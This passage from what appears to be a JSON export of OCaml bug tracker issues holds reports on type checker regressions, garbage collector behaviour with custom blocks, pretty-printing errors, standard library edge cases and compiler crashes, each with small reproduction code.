+beta1\n**Category:** typing\n**Related to:** #7135\n**Monitored by:** @yallop\n\n## Bug description\n\nThis code is accepted by 4.02.3, but rejected by 4.03.0+beta1:\r\n\r\nmodule type S = sig\r\n  type +'a t\r\n\r\n  val foo : [`A] t -> unit\r\n  val bar : [< `A | `B] t -> unit\r\nend\r\n\r\nmodule Make(T : S) = struct\r\n  let f x =\r\n    T.foo x;\r\n    T.bar x;\r\n    (x :> [`A | `C] T.t)\r\nend\n\n## Steps to reproduce\n\n$ ocaml -version\r\nThe OCaml toplevel, version 4.02.3\r\n$ ocaml test.ml\r\n$\r\n\r\nbut\r\n\r\n$ ocaml -version\r\nThe OCaml toplevel, version 4.03.0+beta1\r\n$ ocaml test.ml \r\nFile \"./test.ml\", line 12, characters 4-24:\r\nError: Type [ `A ] T.t is not a subtype of [ `A | `C ] T.t \r\n       The first variant type does not allow tag(s) `C\n\n## Additional information\n\nThis is a simplified version of the error reported in https://github.com/ocaml/opam-repository/pull/6138\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7198\r\n**Reporter:** mfp\r\n**Assigned to:** @damiendoligez\r\n**Status:** resolved (set by @alainfrisch on 2018-11-09T13:24:29Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.02.3\r\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\r\n**Category:** runtime system and C interface\r\n**Related to:** #7100 #7158\r\n**Monitored by:** @braibant @diml @hcarty @alainfrisch\r\n\r\n## Bug description\r\n\r\nI've found a number of instances of the same pattern: a library allocates custom blocks with caml_alloc_custom/caml_alloc_final and hardcodes \"reasonable\" used,max parameters, which latter lead to excessive GC work being performed when an application uses more than max/used \"handles\" at a time (this can happen because the used,max parameters were OK many years ago on computers with less memory, or because the particular usage in the application is not the one anticipated by the lib's author).\r\n\r\nSome examples: the Event module in the (sys)threads library, regexp handles in ocaml-pcre, statement and DB handles in ocaml-sqlite3.\r\n\r\nI expanded on some possible ways to address this in\r\n\r\nocaml/ocaml#7158#c15410\r\n\r\nIn short, it'd be nice to have one of the following:\r\n\r\n* caml_alloc_custom/final-like functions where the memory footprint of the out-of-heap resource can be given so that the GC can adjust its speed using a mechanism similar to the one for in-heap blocks (this would be directly usable in all stubs where the custom blocks represent chunks of memory and not scarce resources)\r\n\r\n* a means to (1) register and (2) list and modify \"build-time constants\" (or more precisely, variables with build-time defaults). This would allow to tweak parameters without having to patch the upstream libs (after the one-time change to use this new API, that is).\r\n\r\nThe latter would allow to address the caml_alloc_custom issue on an application basis, and should also be useful for other \"build-time constants\" where it is hard to provide a value suitable for all application domains. It could be argued that each library could provide such functionality on its own, but the caml_alloc_custom issues I found (and the others likely to lie dormant waiting to be stepped upon) show this doesn't happen in practice. Having an official C + OCaml API for this would lower the barrier of adoption.\r\n"},{"labels":["bug"],"text":"**Original bug ID:** 7197\n**Reporter:** craff\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2016-09-26T15:34:29Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** linux\n**OS:** debian\n**OS Version:** stable\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @hcarty\n\n## Bug description\n\n- duplication when there are no newlines:\r\n\r\n  in set.mli\r\n    type t[@@ocaml.doc \" The type of the set elements. \"]\r\n    val compare : t -> t -> int[@@ocaml.doc \" The type of the set elements.\"]...\r\n\r\n- duplication in .ml even with newlines;\r\n\r\n  in list.ml\r\n     let fast_sort = stable_sort\r\n    [@@@ocaml.text \" sorting + removing duplicates \"]\r\n    let sort_uniq cmp l =\r\n      ... a lot of code ...\r\n    let len = length l in if len < 2 then l else sort len l[@@ocaml.text\r\n                                                           \" sorting + removing duplicates \"]\n\n## Steps to reproduce\n\nocamlc -c -dsource file.ml\n\n## Additional information\n\nThis part of ocaml code seems no worth it. Why not use [@@@ and [@@ only\r\nand provide a script for the transition, while considering (** as\r\ndeprecated.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7196\n**Reporter:** craff\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:16Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** linux\n**OS:** Debian\n**OS Version:** stable\n**Version:** 4.02.3\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** runhang @hcarty\n\n## Bug description\n\nConsider the following file\r\n-------------------\r\nlet _ =\r\n  if true then (\r\n    let open List in\r\n    ();\r\n    ());\r\n  ()\r\n-------------------\r\n\r\nThe pretty printing of ast is wrong:\r\n\r\n$ ocamlc -dsource bug.ml\r\nlet _ = if true then let open List in ((); ()); ()\r\n\r\nit should be\r\n\r\nlet _ = if true then (let open List in ((); ())); ()\r\n\r\nOtherwise, the last unit is parser inside the then branch.\n\n## Steps to reproduce\n\nGiven above\n\n## Additional information\n\n4.03.0 is affected too, I did not check 4.01.0\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7195\n**Reporter:** MonsieurPi\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:08Z)\n**Resolution:** not a bug\n**Priority:** low\n**Severity:** text\n**Version:** 4.02.3\n**Category:** documentation\n\n## Bug description\n\nsubtraction instead of substraction :\r\n\r\nval sub : t -> t -> t\r\n\r\nSubtraction\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7194\n**Reporter:** MonsieurPi\n**Status:** resolved (set by @xavierleroy on 2017-02-17T15:02:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** otherlibs\n\n## Bug description\n\nIf you put wait_next_event[Key_pressed; Poll; ...] and press a key, this key will never be dequeued although it's specifically written in the documentation :\r\n\r\nval wait_next_event : event list -> status\r\n\r\nWait until one of the events specified in the given event list occurs, and return the status of the mouse and keyboard at that time. If Poll is given in the event list, return immediately with the current status. Keypresses are queued, and dequeued one by one when the Key_pressed event is specified.\r\n\r\nI attached a test file.\n\n## File attachments\n\n- [test.ml](https://gist.githubusercontent.com/vicuna/5979fc34e9d61e6fea13f76c378e4318/raw/1aa73c7f96b064ee96b6644cfff3fa3eb1368aee/test.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7192\n**Reporter:** @mmottl\n**Status:** resolved (set by @xavierleroy on 2017-02-16T13:18:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Mac and Linux\n**Version:** 4.02.3\n**Target version:** undecided\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Related to:** #2388 #6651\n**Monitored by:** @gasche @diml @hcarty @alainfrisch @mmottl @garrigue\n\n## Bug description\n\nAfter a day filled with crying spells and intermittent manic laughter I have finally managed to excise a reproducible example with less than 1 KLOC from approx. 30 KLOCs for one of the hardest to reproduce type system bugs I have seen so far.\r\n\r\nNot only is the compiler clearly confused, the most bizarre property of this bug is that the emitted type error of the example will likely disappear if you change completely unrelated and distant parts of the remaining code.  Simply adding or removing superfluous bindings in the implementation or in interfaces almost anywhere in the code will likely do that for you (no guarantees - it depends...).\r\n\r\nThe nature of the bug suggests a major corruption of some lookup tables for signatures used by the type checker.  Maybe there is a hash collision that doesn't get correctly disambiguated, or maybe some indexes in a lookup table get incorrectly shifted somehow.  Maybe there is even a marshaling bug when writing out the compilation files.  It's mysterious.\n\n## Steps to reproduce\n\nInstall OCaml 4.02.3 and the Jane Street Core library (I didn't manage to excise the example without it), extract the attached archive, then call \"ocamlbuild -use-ocamlfind foo_impl.cmo\".\r\n\r\nThe type error I get on both Mac OS X and Linux is:\r\n\r\n-----\r\nFile \"foo_impl.ml\", line 1:\r\nError: The implementation foo_impl.ml\r\n       does not match the interface foo_impl.cmi:\r\n       ...\r\n       At position\r\n         module Close(Blah)() :\r\n           sig module Par : sig module Join : <here> end end\r\n       Type declarations do not match:\r\n         type t = Blah.Par.Join.t\r\n       is not included in\r\n         type t = Foo_intf.Blah.Par.Join.t\r\n       File \"foo_impl.ml\", line 159, characters 25-40: Actual declaration\r\n-----\r\n\r\nThe above makes no sense.  There is no module path to \"Foo_intf.Blah.Par\".\r\n\r\nBut you can make this error easily disappear: just remove e.g. \"let f1 = ...\" near the top of \"foo_impl.ml\".  This function is used nowhere and doesn't appear in any interfaces.  Confused?  Undo the change and now duplicate \"f1\" and make it \"f3\".  The error disappears, too.  Add or remove an argument.  Same thing.  Edit the \"sigs.ml\" file: just adding or removing any of the seemingly superfluous \"val x...\" entries or adding new superfluous types to the signatures can make the error disappear or reappear depending on what you do.  Even adding or removing dummy bindings in the body of some functions in \"foo_impl.ml\" can change everything.\n\n## File attachments\n\n- [strange_type_system_bug.tar.gz](https://gist.githubusercontent.com/vicuna/1ca097be7a222306dfbc9a07f608f49e/raw/acc0add07f0652c123aba696fa8ab8ddd21d249b/strange_type_system_bug.tar.gz)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7191\n**Reporter:** aleksey\n**Assigned to:** @chambart\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:07Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** Linux\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @ygrek @hcarty\n\n## Bug description\n\nocamlopt from 4.03.0+beta1+flambda opam version crashes on compiling the following file:\r\n\r\nlet foo f x = f x [@@specialise]\r\nlet bar = foo (+) 0\r\n\r\nwith the following error:\r\n\r\n>> Fatal error: Stubs may not be annotated as [Always_specialise]: (apply*[foo/56] foo/56\r\n                                                     f/57)\r\n\r\nFatal error: exception Misc.Fatal_error\n"},{"labels":["bug"],"text":"**Original bug ID:** 7190\n**Reporter:** @johnwhitington\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:06Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n(OCaml 4.03 beta 1)\r\n\r\nConsider the following user mistake:\r\n\r\n# type t = Foo of {x : int; y : int};;\r\ntype t = Foo of { x : int; y : int; }\r\n# Foo (1, 2);;\r\nError: This form is not allowed as the type of the inlined record could escape.\r\n\r\nWould it be possible to improve this to say that (1, 2) has type \"int * int\" but t.Foo has type \"{x : int; y : int}\"? The current message doesn't give any hint to help the user fix the mistake.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7189\n**Reporter:** @dbuenzli\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @hcarty @dbuenzli\n\n## Bug description\n\nIt seems that module aliases can significantly reduce the usefullness of #show_module in the toplevel. I think that #show_module should show all the equations and eventual definition in one go. \r\n\r\nSee http://stackoverflow.com/questions/36118521/show-module-tediousness-in-ocaml-utop\r\nfor an example.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7188\n**Reporter:** skrah\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:06Z)\n**Resolution:** won't fix\n**Priority:** low\n**Severity:** minor\n**Version:** 4.02.1\n**Category:** standard library\n\n## Bug description\n\nThe first of these two should probably also raise:\r\n\r\n# float_of_string \"___   1.2\";;\r\n- : float = 1.2\r\n# float_of_string \"1.2   ___\";;\r\nException: Failure \"float_of_string\".\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7187\n**Reporter:** @Drup\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:05Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** ocamldoc\n**Duplicate of:** #7084\n**Related to:** #5901\n\n## Bug description\n\nThe column is the right one, but the line is wrong. Example: \r\n\r\nFile \"/home/gabriel/source/ocaml/typing/typedtree.mli\", line 0, character 2:\r\n{ l1=P1; ...; ln=Pn }     (flag = Closed)\r\n  ^\n"},{"labels":["bug"],"text":"**Original bug ID:** 7186\n**Reporter:** pierpa\n**Status:** closed (set by @mshinwell on 2016-12-08T11:55:09Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Windows\n**OS:** any\n**OS Version:** any\n**Version:** 4.01.0\n**Target version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #4688\n**Monitored by:** braibant @dra27\n\n## Bug description\n\nI expected the following to work, but it doesn't:\r\n\r\n# float_of_string (string_of_float infinity);;\r\nException: Failure \"float_of_string\".\r\n\r\nI need an infinity literal which is accepted by float_of_string.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7183\n**Reporter:** Niols\n**Status:** closed (set by @damiendoligez on 2016-03-23T13:42:31Z)\n**Resolution:** not a bug\n**Priority:** low\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** standard library\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nIn toplevel:\r\n\r\n            OCaml version 4.02.3\r\n\r\n    # let s = \"any string\";;\r\n    val s : string = \"any string\"\r\n\r\n    # String.index_from s (String.length s) '.';;\r\n    Exception: Not_found.\r\n\r\n    # String.index_from s (String.length s + 1) '.';;\r\n    Exception: Invalid_argument \"String.index_from / Bytes.index_from\".\r\n\r\n    # s.[String.length s];;\r\n    Exception: Invalid_argument \"index out of bounds\".\r\n\r\n    #\r\n\r\nwhile in the String lib reference, we have:\r\n\r\n    val index_from : string -> int -> char -> int\r\n    \r\n    String.index_from s i c returns the index of the first occurrence of character c in string s after position i. String.index s c is equivalent to String.index_from s 0 c.\r\n    \r\n    Raise Invalid_argument if i is not a valid position in s. Raise Not_found if c does not occur in s after position i.\r\n\r\nI was thus expecting\r\n\r\n    # String.index_from s (String.length s) '.';;\r\n\r\nto raise\r\n\r\n    Exception: Invalid_argument \"String.index_from / Bytes.index_from\".\r\n\r\nI believe this is because of the line 228 in bytes.ml:\r\n\r\n    if i < 0 || i > l then invalid_arg \"String.index_from / Bytes.index_from\"\r\n\r\nIs this the expected behaviour?\n"},{"labels":["bug"],"text":"**Original bug ID:** 7182\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche\n\n## Bug description\n\n$ cat bug.ml\r\nmodule rec M :\r\nsig    external f : int -> int = \"%identity\" end  =\r\nstruct external f : int -> int = \"%identity\" end \r\n$ ocaml bug.ml\r\nException: Assert_failure (\"camlinternalMod.ml\", 68, 6).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7181\n**Reporter:** @chambart\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0+dev / +beta1\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe example is\r\n\r\ntype 'a tree =\r\n  | Root : [>`Root] tree\r\n  | Leaf : [`Root | `Leaf] tree -> [>`Leaf] tree\r\n\r\nlet rec root (type x) (tree : x tree) : [`Root] tree =\r\n  match tree with\r\n  | Root -> tree\r\n  | Leaf parent -> root parent\r\n\r\nwhich fails with\r\n\r\n  | Root -> tree\r\n            ^^^^\r\nError: This expression has type x tree but an expression was expected of type [ `Root ] tree\r\n       Type x = [> `Root ] is not compatible with type [ `Root ] \r\n       The first variant type does not allow tag(s)\n\n## Additional information\n\nBy the way, I'm not completely certain that this type should not be accepted\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7180\n**Reporter:** braibant\n**Assigned to:** @damiendoligez\n**Status:** feedback (set by @alainfrisch on 2018-11-09T13:29:31Z)\n**Resolution:** reopened\n**Priority:** normal\n**Severity:** minor\n**Category:** runtime system and C interface\n**Related to:** #7100\n**Child of:** #7750\n**Monitored by:** bgrundmann @gasche @diml bobot @hcarty @Yakobowski @alainfrisch\n\n## Bug description\n\nI am trying to understand the changes in the Gc heuristics in the upcoming 4.03 w.r.t custom blocks. More specifically, I looked at how the value of caml_extra_heap_resources in major_gc.c contributes to make the Gc run major collection more often. \r\n \r\nI am puzzled by the output of the attached test program. It's a loop that allocates k custom blocks with used = 1, max = 1000. The payload of the blocks is a pointer to (big) heap allocated region (to detect issues). The main loop calls `Gc.major_slice i` every so often (where i is a small int).\r\n\r\nIn 4.02.3, the program reaches a steady state: the custom blocks are deallocated as expected, Gc.major_slice returns a non-zero integer.  \r\n\r\nIn todays's 4.03 (or 4.03.0+beta1), depending on the value of k and i, it's possible to get a steady state, or to eat all the available memory. If Gc.major_slice is called with i = 0 or a small int, its return value is 0. If Gc.major_slice is called with i = 10, the return value of Gc.major_slice is still 0, and the program quickly eats all available memory. \r\n\r\nReturning 0 seems to violate the documentation for 4.02.3 \"In all cases, the result is the computed slice size.\" (It would be nice to document the unit of the size here.)\r\n\r\nThe fact that the program eats all memory seems to violate this part of the manual (which has not changed between 4.02.3 and 4.03.0+beta1)\r\nhttps://github.com/ocaml/ocaml/blob/4.03/manual/manual/cmds/intf-c.etex#L1804-L1811\r\n\r\nThe way I read it is that I should expect one full major collection every N allocations (when used/max = 1 / N). It seems that giving \"bad\" slice sizes to Gc.major_slice confuses the speed heuristic. \r\n\r\nI tried to have a look at the Gc code to understand better what was going on, and I am confused by the code that was added by this commit https://github.com/ocaml/ocaml/commit/0225ca01e39289ce1801fb09cd011cdbfb542b8d\r\n\r\nhttps://github.com/ocaml/ocaml/blob/4.03/byterun/major_gc.c#L679-L680\r\nhttps://github.com/ocaml/ocaml/blob/4.03/byterun/major_gc.c#L803\r\n\r\nif p is capped at 0.3, why do we reset caml_extra_heap_resources to 0.0? Shouldn't it be decreased by the actual amount of work that was done to copy with the steady state assumption?\n\n## Steps to reproduce\n\nopam switch 4.03.0+beta1\r\nmake clean\r\nmake test # build the test binary\r\nmake success # call Gc.major_slice 0, reach a steady state.\r\nmake failure # call Gc.major_slice 10, runs out of memory\r\n\r\nopam switch 4.02.3 \r\nmake clean\r\nmake test # build the test binary\r\nmake success # call Gc.major_slice 0, reach a steady state\r\nmake failure # call Gc.major_slice 10, reach a steady state\n\n## File attachments\n\n- [test-gc-major-slice.tar.gz](https://gist.githubusercontent.com/vicuna/dd7905012692adc93faad68e51d4c0c6/raw/2dc22956b3f5b49367fc2b5cde0886c88a345c1e/test-gc-major-slice.tar.gz)\n- [test-gc-minor-slice-4-03.ml](https://gist.githubusercontent.com/vicuna/dd7905012692adc93faad68e51d4c0c6/raw/92a94687aa6e73f8d2b849853a2911f9c5048b4a/test-gc-minor-slice-4-03.ml)\n- [test-gc-minor-slice.tar.gz](https://gist.githubusercontent.com/vicuna/dd7905012692adc93faad68e51d4c0c6/raw/311ace906d39f23295d190305931757a5fd7a94f/test-gc-minor-slice.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7179\r\n**Reporter:** goswin\r\n**Status:** acknowledged (set by @damiendoligez on 2016-03-14T13:34:46Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Category:** documentation\r\n**Monitored by:** @jmeber\r\n\r\n## Bug description\r\n\r\nWhen an ocaml function is used as callback from C code and the last thing the callback does is call a C stub returning unit and the return register happens to contain ((x & 3) == 2) then this is taken as an exception. When caml_callback() is used this carshes and when caml_callback_exn is garbage is returned from Extract_exception().\r\n\r\nOcaml should sanitize the return register after calling the C stub.\r\n\r\n## Steps to reproduce\r\n\r\n% make\r\nocamlopt -g -c -o main.cmx main.ml\r\ngcc -O2 -W -Wall -g -c -o stubs.o stubs.c\r\nocamlopt -o test main.cmx stubs.o\r\n./test\r\ntest(0x61ea78)\r\nfail\r\ntest: callback got exception 0x0\r\n\r\n==> Makefile <==\r\n        ocamlopt -o $@ $+\r\n\r\n%.cmx: %.ml\r\n        ocamlopt -g -c -o $@ $<\r\n\r\n%.o: %.c\r\n        gcc -O2 -W -Wall -g -c -o $@ $<\r\n\r\nclean:\r\n        rm -f test *.o *.cmx *.cmi *~\r\n\r\n==> main.ml <==\r\nexternal fail : unit -> unit = \"fail\"\r\nexternal test : (unit -> unit) -> unit = \"test\"\r\n\r\nlet callback () =\r\n  fail ()\r\n   \r\nlet () =\r\n  test callback\r\n\r\n\r\n==> stubs.c <==\r\n    CAMLparam1(callback);\r\n    CAMLlocal1(res);\r\n    printf(\"%s(0x%lx)\\n\", __PRETTY_FUNCTION__, callback);\r\n    res = caml_callback_exn(callback, Val_unit);\r\n    if (Is_exception_result(res)) {\r\n        res = Extract_exception(res);\r\n        fprintf(stderr, \"%s: callback got exception 0x%lx\\n\", __PRETTY_FUNCTION__, res);\r\n    }\r\n    CAMLreturn0;\r\n}\r\n\r\n## Additional information\r\n\r\nhttps://github.com/mrvn/ocam-problems/tree/false-exception\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7178\n**Reporter:** @dbuenzli\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2018-05-23T18:00:20Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n**Related to:** #7796\n**Monitored by:** @gasche @diml @hcarty @dbuenzli\n\n## Bug description\n\nE.g. in C the following program will exit with 1.\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\nvoid do_exit (void)\r\n{\r\n  puts (\"Goodbye, world!\\n\");\r\n  exit (1);\r\n}\r\n\r\nint main (int argc, char *argv[])\r\n{\r\n  atexit (do_exit);\r\n  puts (\"Hello, world!\\n\");\r\n  return 0;\r\n}\n\n## Steps to reproduce\n\nocaml\r\n# at_exit (fun () -> exit 1);;\r\n- : unit = ()\r\n# ^D\r\nFatal error: exception Stack overflow\r\nRaised by primitive operation at file \"pervasives.ml\", line 515, characters 30-3\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7177\n**Reporter:** sbleazard\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-02-20T10:46:26Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** Dell\n**OS:** CentOS\n**OS Version:** 6.6\n**Version:** 4.02.3\n**Target version:** undecided\n**Category:** standard library\n**Duplicate of:** #6973\n**Monitored by:** @diml @hcarty\n\n## Bug description\n\nstderr is buffered when using some prerr.. functions. This appears to be the opposite to the normal expectation for stderr\n\n## Steps to reproduce\n\nlet () =\r\n  prerr_endline \"foo\";\r\n  prerr_string \"foobar\\n\";\r\n  Unix.sleep 5\r\n\r\nfoo will print out but foobar will not until after the sleep. The C version works, printing foofoobar before the sleep:\r\n\r\n#include <stdio.h>\r\n\r\nmain(int argc, char **argv)\r\n{\r\n  fprintf(stderr, \"foo\");\r\n  fprintf(stderr, \"foobar\\n\");\r\n  sleep(5);\r\n}\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7174\n**Reporter:** MonsieurPi\n**Status:** resolved (set by @xavierleroy on 2017-02-17T15:13:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** documentation\n\n## Bug description\n\nI found a \"bug\" in the Graphics library in OCaml :\r\n\r\nIf you write \r\n\r\n  let () = \r\n    let open Graphics in\r\n    open_graph \" 800x800\";\r\n    draw_segments [|200,0,200,33567|];\r\n    ignore (read_key ())\r\n\r\nNo problem.\r\n\r\nBut if you write \r\n\r\n  let () = \r\n    let open Graphics in\r\n    open_graph \" 800x800\";\r\n    draw_segments [|200,0,200,33568|];\r\n    ignore (read_key ())\r\n\r\n(I just changed 33567 to 33568.)\r\n\r\nYou have no line.\r\n\r\nStrange, no ? \r\n\r\nWell, actually, no. The coordinates are coded on 16 bits signed integers which corresponds to a range between [-32768, 32767] and if you add to it the size of my graph (here, 800) + 1 it goes out (which corresponds to 33568)\r\n\r\nThis behaviour is normal but the documentation of Graphics should add a remark about it because in the OCaml manual (http://caml.inria.fr/pub/docs/manual-ocaml-4.00/manual040.html) it's specified that \"Drawing is clipped to the screen.\"\r\n\r\nRegards\n\n## Steps to reproduce\n\nlet () = \r\n    let open Graphics in\r\n    open_graph \" 800x800\";\r\n    draw_segments [|200,0,200,33568|];\r\n    ignore (read_key ())\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7171\n**Reporter:** bay2@illinois.edu\n**Assigned to:** @lpw25\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:03Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nDear Sir or Madam,\r\n\r\nRunning the following code on OCaml version 4.02.3 yields the following output:\r\n\r\n# let f ?x y = match x with None -> y | Some z -> z +y ;;             \r\nval f : ?x:int -> int -> int = <fun>\r\n\r\n1)\r\n# f 2 ?x:(Some 3);;\r\n- : int = 5\r\n\r\n2)\r\n# (f 2) ?x:(Some 3);;\r\nError: This expression has type int\r\n       This is not a function; it cannot be applied.\r\n\r\nThis seems to indicate that in an application, OCaml evaluates the argument list to a function before applying one argument after the other to the function. Is OCaml not well defined? Do you have a semantics for OCaml to share?\r\n\r\nBest,\r\nMichael\n\n## Steps to reproduce\n\n# let f ?x y = match x with None -> y | Some z -> z +y ;;             \r\nval f : ?x:int -> int -> int = <fun>\r\n\r\n# f 2 ?x:(Some 3);;\r\n- : int = 5\r\n\r\n# (f 2) ?x:(Some 3);;\r\nError: This expression has type int\r\n       This is not a function; it cannot be applied.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7170\n**Reporter:** @kayceesrk\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:03Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** afl\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nCompiling the program\r\n\r\nexternal foo : 'a = \"\"\r\n\r\ncrashes ocamlopt.opt with Fatal error: exception Invalid_argument(\"index out of bounds\"). The bug was found by fuzzing afl-instrumented ocamlopt.opt.\n\n## Steps to reproduce\n\n$ cat test.ml\r\nexternal foo : 'a = \"\"\r\n$ ocamlopt.opt test.ml\r\nFatal error: exception Invalid_argument(\"index out of bounds\")\r\n$ OCAMLRUNPARAM=\"b\" ocamlopt.opt test.ml\r\nFatal error: exception Invalid_argument(\"index out of bounds\")\r\nCalled from file \"arg.ml\", line 214, characters 2-73\n"},{"labels":["bug"],"text":"**Original bug ID:** 7169\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-07-01T15:17:26Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #7504\n**Monitored by:** @hcarty\n\n## Bug description\n\nIn discussion https://www.reddit.com/r/ocaml/comments/49g5yi/doubt_about_pattern_matching/ , a beginner has a two-field records {player1; player2} that he pattern-matches on, and he gets the following non-exhaustivity warning (one possible player value is not handled);\r\n\r\n> Warning 8: this pattern-matching is not exhaustive.\r\n> Here is an example of a value that is not matched:\r\n> {player1=Spock}\r\n\r\nThe beginner asks:\r\n\r\n> AFAIK, I can not create a record with only the first item:\r\n>\r\n> utop[17]> let x = {player1=Spock};;\r\n> Error: Some record fields are undefined: player2\r\n\r\nI think the beginner is right: this error message is confusing.\r\n\r\nI would propose to rephrase it as follows:\r\n\r\n> Here is an example of a *case* that is not matched:\r\n> {player1=Spock}\r\n\r\n(It would also possibly be a good idea to print partial record patterns with a trailing \"; _\" in this case, to highlight that this is not expected to be a constructible value, but I'm not sure whether that part is worth the trouble.)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7168\n**Reporter:** @jhjourdan\n**Status:** closed (set by @damiendoligez on 2016-04-15T09:30:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** amd64\n**OS:** Linux\n**Version:** 4.03.0+dev / +beta1\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** runtime system and C interface\n\n## Bug description\n\nWhen compiling and running the attached program in *bytecode* mode, I get a libc error (free(): invalid pointer).\r\n\r\nThe reason is that the interpreter stack is exceeded without being reallocated. The estimation of stack usage computed in bytegen.ml is too optimistic in some cases. The situation is even worsened by Setup_for_event, which can use up to 6 stack slots at any time.\r\n\r\nI can see two solutions: either we implement a precise stack usage approximation, but this can be difficult to take into account all the situations, or I suggest using a large security margin when allocation the stack buffer (e.g. 1k word).\n\n## File 